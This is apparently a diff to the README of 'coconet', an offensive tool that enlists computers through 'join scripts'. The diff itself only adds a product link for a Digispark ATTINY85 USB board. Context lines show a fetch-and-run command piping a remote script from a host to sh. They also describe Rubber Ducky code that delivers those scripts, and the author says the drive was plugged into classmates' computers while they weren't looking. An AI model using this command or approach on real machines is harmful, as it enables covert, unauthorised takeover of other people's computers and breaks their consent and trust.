@@ -74,7 +74,7 @@ curl [host]:2042/j |sh
 ### Rubber Duck code
 In the `duck` directory, you'll find Arduino code for delivering the join scripts automatically to macOS and Linux computers.
 
-I used this code with a Digispark ATTINY85 drive, though it can be easily modified to work with other Rubber Duck USBs.
+I used this code with a [Digispark ATTINY85](http://www.alibaba.com/product-detail/Digispark-kickstarter-development-board-ATTINY85-module_60411308561.html), though it can be easily modified to work with other Rubber Duck USBs based on Arduino.
 
 During the cybersecurity class in which I developed `coconet`, I plugged the drive into users' computers while they weren't looking, saving me the inconvenience of having to attain keyboard access.
 
